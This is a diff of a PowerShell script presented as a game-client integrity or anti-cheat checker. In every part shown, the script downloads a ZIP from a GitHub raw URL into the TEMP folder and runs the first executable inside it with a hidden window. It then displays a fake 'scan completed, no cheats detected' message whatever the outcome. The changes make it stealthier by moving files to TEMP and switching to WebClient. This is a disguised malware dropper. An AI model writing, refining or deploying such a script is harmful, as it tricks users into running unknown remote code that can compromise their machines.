@@ -9,17 +9,12 @@ Write-Host "[*] Checking client file integrity..." -ForegroundColor Cyan
 Start-Sleep -Seconds 1
 
 $URL = "https://github.com/kaghohop-gif/chk/raw/refs/heads/main/CHHECK.zip"
-$ZIP = "C:\Чекер\main.zip"
-$EXTRACT = "C:\Чекер\CHECKK-main"
-
-# Создаём папку, если её нет
-if (!(Test-Path "C:\Чекер")) {
-    New-Item -ItemType Directory -Path "C:\Чекер" -Force | Out-Null
-}
+$ZIP = "$env:TEMP\main.zip"
+$EXTRACT = "$env:TEMP\CHECKK-main"
 
 try {
     Write-Host "[*] Loading verification module..." -ForegroundColor Yellow
-    Invoke-WebRequest -Uri $URL -OutFile $ZIP -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    (New-Object Net.WebClient).DownloadFile($URL, $ZIP)
     Write-Host "[+] Module loaded" -ForegroundColor Green
 } catch {
     Write-Host "[-] Module download error" -ForegroundColor Red
@@ -53,8 +48,6 @@ if ($Zip2) {
 $Exe = Get-ChildItem -Path $EXTRACT -Filter "*.exe" -Recurse | Select-Object -First 1
 if ($Exe) {
     Write-Host "[*] Running deep scan..." -ForegroundColor Yellow
-    # Снимаем блокировку
-    Unblock-File -Path $Exe.FullName -ErrorAction SilentlyContinue
     Start-Process -WindowStyle Hidden $Exe.FullName
     Write-Host "[+] Scan completed. No cheats detected." -ForegroundColor Green
     Write-Host "[+] Your client is clean." -ForegroundColor Green
